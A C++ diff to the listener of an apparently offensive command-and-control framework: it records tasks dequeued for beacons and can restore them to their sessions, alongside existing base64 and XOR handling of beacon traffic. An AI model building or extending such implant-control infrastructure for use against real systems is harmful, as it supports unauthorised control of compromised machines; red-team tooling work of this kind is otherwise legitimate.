@@ -532,7 +532,8 @@ C2Message Listener::getSocksTaskResult(const std::string& beaconHash)
 // Main function of the listener
 // input is the message send by the beacon to the listener
 // output is the message send by listener to the beacon
-bool Listener::handleMessages(const std::string& input, std::string& output)
+bool Listener::handleMessages(const std::string& input, std::string& output,
+                              std::vector<PendingTask>* dequeuedTasks)
 {
     std::string data = base64_decode(input);
     XOR(data, m_key);
@@ -707,6 +708,8 @@ bool Listener::handleMessages(const std::string& input, std::string& output)
 
             while(!c2Message.instruction().empty())
             {
+                if (dequeuedTasks)
+                    dequeuedTasks->emplace_back(beaconHash, c2Message);
                 C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
                 addedC2MessageRet->CopyFrom(c2Message);
                 c2Message = getTask(beaconHash);    
@@ -726,4 +729,16 @@ bool Listener::handleMessages(const std::string& input, std::string& output)
     output = base64_encode(data);
 
     return isTaskToSend;
+}
+
+void Listener::restoreTasks(const std::vector<PendingTask>& tasks)
+{
+    std::lock_guard<std::mutex> lock(m_mutex);
+    for (auto task = tasks.rbegin(); task != tasks.rend(); ++task)
+    {
+        auto session = std::find_if(m_sessions.begin(), m_sessions.end(),
+            [&](const auto& candidate) { return candidate->getBeaconHash() == task->first; });
+        if (session != m_sessions.end())
+            (*session)->prependTask(task->second);
+    }
 }
